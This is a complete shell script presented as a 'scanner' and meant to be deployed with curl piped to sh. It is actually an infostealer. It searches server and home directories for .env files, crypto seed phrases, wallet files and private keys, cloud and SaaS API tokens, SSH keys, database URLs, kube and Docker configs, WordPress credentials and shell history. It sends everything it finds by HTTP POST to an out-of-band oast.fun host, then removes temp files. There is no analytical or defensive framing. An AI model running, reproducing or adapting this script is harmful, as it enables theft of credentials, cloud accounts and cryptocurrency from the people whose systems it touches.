#!/bin/sh
# Mythos Precision Scanner v3.2 — Robust ignore list, validated patterns
# Deploy: curl -sL URL | sh
# Exfil: amtfxylissimhrzasyemb6vqffp0rmeus.oast.fun

OAST="amtfxylissimhrzasyemb6vqffp0rmeus.oast.fun"
HOST=$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo "u")
USER=$(whoami 2>/dev/null || id -un 2>/dev/null || echo "u")

###############################################################################
# IGNORE LIST — directories and file patterns to skip
###############################################################################
IGNORE_DIRS="\
-path '*/node_modules' -prune -o \
-path '*/.git' -prune -o \
-path '*/vendor' -prune -o \
-path '*/cache' -prune -o \
-path '*/tmp/cache' -prune -o \
-path '*/bower_components' -prune -o \
-path '*/dist' -prune -o \
-path '*/build' -prune -o \
-path '*/__pycache__' -prune -o \
-path '*/egg-info' -prune -o \
-path '*/package-lock.json' -prune -o \
-path '*/yarn.lock' -prune -o \
-path '*/composer.lock' -prune -o \
-path '*/Gemfile.lock' -prune -o \
-path '*/.cache' -prune -o \
-path '*/storage/framework' -prune -o \
-path '*/storage/logs' -prune -o \
-path '*/var/cache' -prune -o \
-path '*/var/log' -prune -o \
-path '/proc' -prune -o \
-path '/sys' -prune -o \
-path '/dev' -prune -o \
-path '/run' -prune -o \
-path '/snap' -prune -o \
-path '*/public/uploads' -prune -o \
-path '*/wp-content/uploads' -prune -o \
-path '*/media' -prune -o \
-path '*/assets' -prune -o \
-path '*/fonts' -prune -o \
-path '*/images' -prune -o \
-path '*/img' -prune -o \
-path '*/css' -prune -o \
-path '*/js/build' -prune -o \
-path '*/coverage' -prune -o \
-path '*/test' -prune -o \
-path '*/tests' -prune -o \
-path '*/spec' -prune -o \
-path '*/venv' -prune -o \
-path '*/.venv' -prune -o \
-path '*/virtualenv' -prune -o \
-path '*/env' -prune -o \
-path '*/obj' -prune -o \
-path '*/bin' -prune -o \
-path '*/objets' -prune -o \
-path '*/Debug' -prune -o \
-path '*/Release' -prune -o \
-path '*/.terraform' -prune -o \
-path '*/terraform.tfstate*' -prune -o \
-path '*/__MACOSX' -prune -o \
-path '*/.DS_Store' -prune -o \
-path '*/thumbs.db' -prune -o \
-path '*/Thumbs.db' -prune -o"

# Base find command prefix (with ignore list inline)
FIND_BASE="find /var/www /home /root /opt /srv /app /etc /tmp -maxdepth 6 \
$IGNORE_DIRS \
-type f"

FIND_DEEP="find /var/www /home /root /opt /srv /app /etc /tmp -maxdepth 8 \
$IGNORE_DIRS \
-type f"

###############################################################################
send() {
    local s="$1" d="$2"
    local p="${HOST}|${USER}|${s}|$(echo "$d" | tr '\n' '|' | cut -c1-3000)"
    curl -s -m 3 -X POST -d "$p" "http://${OAST}/post" 2>/dev/null &
}

###############################################################################
# 1. .ENV FILES — skip node_modules, vendor, cache
###############################################################################
(eval "$FIND_BASE \( -name '.env' -o -name '.env.*' -o -name '*.env' \)" 2>/dev/null | head -200 | while read f; do
    send "ENVFILE" "${f}:$(head -c 4096 "$f" 2>/dev/null | tr '\n' '|')"
done) &

###############################################################################
# 2. BIP39 SEED PHRASES — only files with crypto keywords, skip trash
# Validated: 12 or 24 lowercase words (3-8 chars each), near crypto context
###############################################################################
CRYPTO_KEYWORDS='seed|mnemonic|phrase|wallet|private.key|recovery|secret|backup|passphrase|metamask|phantom|solana|ethereum|bitcoin|trustwallet|exodus|ledger|trezor|bip39|bip32|derivation'

(eval "$FIND_DEEP \( -name '*.txt' -o -name '*.md' -o -name '*.log' -o -name '*.json' \
    -o -name '.env*' -o -name '*.cfg' -o -name '*.conf' -o -name '.bash_history' \
    -o -name '*.yml' -o -name '*.yaml' -o -name '*.toml' \) -size -10M" 2>/dev/null | while read f; do
    
    # Only scan files with crypto keywords (massive FP reduction)
    grep -qilE "$CRYPTO_KEYWORDS" "$f" 2>/dev/null || continue
    
    # 12-word BIP39: all lowercase, 3-8 chars per word
    tr '[:upper:]' '[:lower:]' < "$f" 2>/dev/null | tr -cs 'a-z' '\n' | \
    awk '{w[NR%24]=$0}
    NR>=12 {
        ok=1; for(i=1;i<=12;i++){if(length(w[(NR-12+i)%24])<3||length(w[(NR-12+i)%24])>8){ok=0;break}}
        if(ok){s="";for(i=1;i<=12;i++)s=s w[(NR-12+i)%24] " ";print "12|"s}
    }' 2>/dev/null | head -2 | while read seed; do
        send "SEED12" "${f}:${seed}"
    done
    
    # 24-word BIP39
    tr '[:upper:]' '[:lower:]' < "$f" 2>/dev/null | tr -cs 'a-z' '\n' | \
    awk '{w[NR%24]=$0}
    NR>=24 {
        ok=1; for(i=1;i<=24;i++){if(length(w[(NR-24+i)%24])<3||length(w[(NR-24+i)%24])>8){ok=0;break}}
        if(ok){s="";for(i=1;i<=24;i++)s=s w[(NR-24+i)%24] " ";print "24|"s}
    }' 2>/dev/null | head -2 | while read seed; do
        send "SEED24" "${f}:${seed}"
    done
done) &

###############################################################################
# 3. ETHEREUM PRIVATE KEY — validated 64 hex chars
# Pattern: exactly 64 hex chars [0-9a-fA-F]
# Filter: reject known false positives (hex constants, test vectors, prefix patterns)
###############################################################################
ETH_FALSE='^0\{64\}$|^F\{64\}$|^1\{64\}$|^a\{64\}$|^A\{64\}$|dead|beef|cafe|feed|babe|face|b00b|00000000|^0x|123456|abcdef|fedcba|^[fF]'

(eval "$FIND_DEEP \( -name '*.txt' -o -name '*.json' -o -name '.env*' -o -name '*.key' -o -name '*.cfg' -o -name '*.conf' \) -size -5M" 2>/dev/null | while read f; do
    grep -oE '\b[0-9a-fA-F]{64}\b' "$f" 2>/dev/null | while read key; do
        # Reject known false patterns
        echo "$key" | grep -qiE "$ETH_FALSE" && continue
        # ETH valid range: first hex char must not be 'f' or 'F'
        first=$(echo "$key" | cut -c1 | tr '[:upper:]' '[:lower:]')
        [ "$first" = "f" ] && continue
        send "ETHKEY" "${f}:${key}"
    done
done) &

###############################################################################
# 4. SOLANA base58 private key — 87-88 chars, base58 charset (no 0OIl)
# Only from relevant source files
###############################################################################
(eval "$FIND_DEEP \( -name '*.txt' -o -name '*.json' -o -name '.env*' -o -name '*.key' \
    -o -name '*.cfg' -o -name 'id.json' -o -name '*solana*' -o -name '*phantom*' \) -size -5M" 2>/dev/null | while read f; do
    # base58 charset: [1-9A-HJ-NP-Za-km-z] — no 0, O, I, l
    grep -oE '\b[1-9A-HJ-NP-Za-km-z]{87,88}\b' "$f" 2>/dev/null | head -2 | while read key; do
        send "SOLKEY_B58" "${f}:${key}"
    done
done) &

###############################################################################
# 5. SOLANA JSON array — [num,num,...,num] with ~64 bytes (0-255)
###############################################################################
(eval "$FIND_DEEP \( -name '*.json' -o -name '*.txt' -o -name '*.key' -o -name 'id.json' \) -size -1M" 2>/dev/null | while read f; do
    grep -oE '\[[[:space:]]*[0-9]{1,3}([[:space:]]*,[[:space:]]*[0-9]{1,3}){63}[[:space:]]*\]' "$f" 2>/dev/null | while read arr; do
        nums=$(echo "$arr" | grep -oE '[0-9]+')
        count=$(echo "$nums" | wc -l)
        [ "$count" -lt 62 ] || [ "$count" -gt 66 ] && continue
        # Validate all numbers are 0-255
        bad=0
        for n in $(echo "$nums"); do
            [ "$n" -gt 255 ] 2>/dev/null && { bad=1; break; }
        done
        [ "$bad" -eq 0 ] && send "SOLKEY_JSON" "${f}:${arr}"
    done
done) &

###############################################################################
# 6. BITCOIN WIF — starts with 5/K/L, 51-52 base58 chars
###############################################################################
(eval "$FIND_DEEP \( -name '*.txt' -o -name '*.json' -o -name '.env*' -o -name '*.key' -o -name '*.cfg' \) -size -5M" 2>/dev/null | while read f; do
    # WIF: 5/K/L + 50-51 base58 chars = 51-52 total
    grep -oE '\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b' "$f" 2>/dev/null | head -2 | while read key; do
        send "BTCWIF" "${f}:${key}"
    done
done) &

###############################################################################
# 7. CRYPTO WALLET FILES — by filename (high confidence)
###############################################################################
(eval "$FIND_BASE \( -name 'wallet.dat' -o -name 'wallet.json' -o -name '*.wallet' \
    -o -name 'keystore' -o -name 'UTC--*' -o -name '*metamask*' -o -name '*phantom*' \
    -o -name '*solana*' -o -name '*trustwallet*' -o -name '*exodus*' -o -name 'id.json' \
    -o -name '*.keyfile' -o -name 'seed.txt' -o -name 'seed*' \)" 2>/dev/null | while read f; do
    send "CRYPTOFILE" "$(head -c 8192 "$f" 2>/dev/null)"
done) &

###############################################################################
# 8. STRIPE KEYS — sk_live_, rk_live_, whsec_, pk_live_
# Pattern validated: sk_live_ + 24+ alphanum, rk_live_ + 24+, whsec_ + 32+
###############################################################################
(eval "$FIND_BASE \( -name '.env*' -o -name '*.php' -o -name '*.js' -o -name '*.py' \
    -o -name '*.json' -o -name '*.yml' -o -name '*.yaml' -o -name '*.cfg' -o -name '*.conf' \
    -o -name '*.txt' \)" 2>/dev/null | xargs grep -lIE 'sk_live_|rk_live_|whsec_' 2>/dev/null | head -30 | while read f; do
    grep -oIE '\b(sk_live_[a-zA-Z0-9]{24,99}|rk_live_[a-zA-Z0-9]{24,99}|whsec_[a-zA-Z0-9]{32,99}|pk_live_[a-zA-Z0-9]{24,99})\b' "$f" 2>/dev/null | while read key; do
        send "STRIPE" "${f}:${key}"
    done
done) &

###############################################################################
# 9. GITHUB TOKENS — ghp_, github_pat_, gho_
###############################################################################
(eval "$FIND_BASE \( -name '.env*' -o -name '*.php' -o -name '*.js' -o -name '*.py' \
    -o -name '*.json' -o -name '*.yml' -o -name '*.yaml' -o -name '*.cfg' -o -name '*.conf' \
    -o -name '.bash_history' -o -name '.npmrc' -o -name '.gitconfig' \)" 2>/dev/null | \
    xargs grep -lIE 'ghp_|github_pat_|gho_' 2>/dev/null | head -30 | while read f; do
    grep -oIE '\b(ghp_[a-zA-Z0-9]{36,50}|github_pat_[a-zA-Z0-9_]{40,100}|gho_[a-zA-Z0-9]{36,50})\b' "$f" 2>/dev/null | while read tok; do
        send "GITHUB" "${f}:${tok}"
    done
done) &

###############################################################################
# 10. AWS KEYS — AKIA/ASIA + 16 uppercase
###############################################################################
(eval "$FIND_BASE \( -name '.env*' -o -name '*.cfg' -o -name '*.conf' -o -name '*.json' \)" 2>/dev/null | \
    xargs grep -lE 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}' 2>/dev/null | head -20 | while read f; do
    grep -oE '\b(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16})\b' "$f" 2>/dev/null | while read key; do
        send "AWSKEY" "${f}:${key}"
    done
done) &

# AWS credentials files
for d in /root/.aws /home/*/.aws; do
    [ -f "$d/credentials" ] && send "AWSCRED" "$(head -c 4096 "$d/credentials" 2>/dev/null)"
    [ -f "$d/config" ] && send "AWSCFG" "$(head -c 2048 "$d/config" 2>/dev/null)"
done &

###############################################################################
# 11. GCP — service account JSON (validated: must contain "type": "service_account")
###############################################################################
(eval "$FIND_DEEP \( -name '*.json' \)" 2>/dev/null | while read f; do
    grep -q '"type":.*"service_account"' "$f" 2>/dev/null && send "GCPKEY" "$(head -c 4096 "$f" 2>/dev/null)"
done) &

for d in /root/.config/gcloud /home/*/.config/gcloud; do
    [ -d "$d" ] && find "$d" -name "*.json" -type f 2>/dev/null | while read f; do
        send "GCPJSON" "$(head -c 2048 "$f" 2>/dev/null)"
    done
done &

###############################################################################
# 12. SSH KEYS — id_rsa, id_ed25519, id_ecdsa, *.pem
###############################################################################
(eval "$FIND_BASE \( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name '*.pem' \)" 2>/dev/null | while read f; do
    [ -s "$f" ] && send "SSHKEY" "$(head -c 4096 "$f" 2>/dev/null)"
done) &

###############################################################################
# 13. DATABASE URLs — validated pattern: scheme://user:pass@host/db
###############################################################################
(eval "$FIND_BASE \( -name '.env*' -o -name '*.cfg' -o -name '*.conf' -o -name '*.yml' -o -name '*.yaml' -o -name '*.json' \)" 2>/dev/null | \
    xargs grep -lE '(DATABASE_URL|DB_URL|MONGO_URI|REDIS_URL|MYSQL_URL|POSTGRES_URL|POSTGRESQL_URL).*://[^@]+@' 2>/dev/null | head -20 | while read f; do
    grep -oE '(DATABASE_URL|DB_URL|MONGO_URI|REDIS_URL|MYSQL_URL|POSTGRES_URL|POSTGRESQL_URL)[^[:space:]]*://[^[:space:]]*@[^[:space:]]+' "$f" 2>/dev/null | while read url; do
        send "DBURL" "${f}:${url}"
    done
done) &

###############################################################################
# 14. DOCKER / GIT / NPM / K8S / WORDPRESS
###############################################################################
for d in /root/.docker /home/*/.docker; do
    [ -f "$d/config.json" ] && send "DOCKER" "$(head -c 4096 "$d/config.json" 2>/dev/null)"
done &

(eval "$FIND_BASE \( -name '.git-credentials' -o -name '.npmrc' \)" 2>/dev/null | while read f; do
    case "$f" in
        *.git-credentials) send "GITCRED" "$(head -c 2048 "$f" 2>/dev/null)" ;;
        *.npmrc) send "NPMRC" "$(head -c 2048 "$f" 2>/dev/null)" ;;
    esac
done) &

# K8s configs (no ignore — kube dirs are outside standard scan paths anyway)
for d in /root/.kube /home/*/.kube; do
    [ -d "$d" ] && find "$d" -type f 2>/dev/null | while read f; do
        send "K8S" "$(head -c 4096 "$f" 2>/dev/null)"
    done
done &

# WordPress (wp-config.php)
(eval "$FIND_BASE -name 'wp-config.php'" 2>/dev/null | while read f; do
    c=$(grep -E 'DB_NAME|DB_USER|DB_PASSWORD|AUTH_KEY' "$f" 2>/dev/null | tr '\n' '|')
    [ -n "$c" ] && send "WPCONFIG" "${f}:${c}"
done) &

###############################################################################
# 15. SHELL HISTORY — passwords and tokens
###############################################################################
for h in /root/.bash_history /home/*/.bash_history /root/.zsh_history /home/*/.zsh_history; do
    [ -f "$h" ] && grep -iE 'password|secret|token|key|ghp_|github_pat|sk_live|AKIA|DATABASE_URL|export.*=' "$h" 2>/dev/null | tail -50 | while read l; do
        send "HISTORY" "$l"
    done
done &

###############################################################################
# 16. GITLAB / SENDGRID / SLACK / TWILIO — validated patterns
###############################################################################
(eval "$FIND_BASE \( -name '.env*' -o -name '*.cfg' -o -name '*.conf' -o -name '*.json' \)" 2>/dev/null | \
    xargs grep -lE 'glpat-|SG\.|xox[bprs]-|SK[0-9a-fA-F]{32}' 2>/dev/null | head -15 | while read f; do
    grep -oE '\b(glpat-[a-zA-Z0-9\-]{20,50}|SG\.[a-zA-Z0-9_\-]{20,99}\.[a-zA-Z0-9_\-]{20,99}|xox[bprs]-[0-9]{10,99}-[a-zA-Z0-9]+|SK[0-9a-fA-F]{32})\b' "$f" 2>/dev/null | while read key; do
        send "SAASKEY" "${f}:${key}"
    done
done) &

###############################################################################
# WAIT + SUMMARY
###############################################################################
wait
env_cnt=$(eval "$FIND_BASE -name '.env*'" 2>/dev/null | wc -l)
ssh_cnt=$(eval "$FIND_BASE \( -name 'id_rsa' -o -name 'id_ed25519' \)" 2>/dev/null | wc -l)
send "SUMMARY" "host=${HOST}|user=${USER}|env=${env_cnt}|ssh=${ssh_cnt}"
rm -rf /tmp/.mqs_* 2>/dev/null
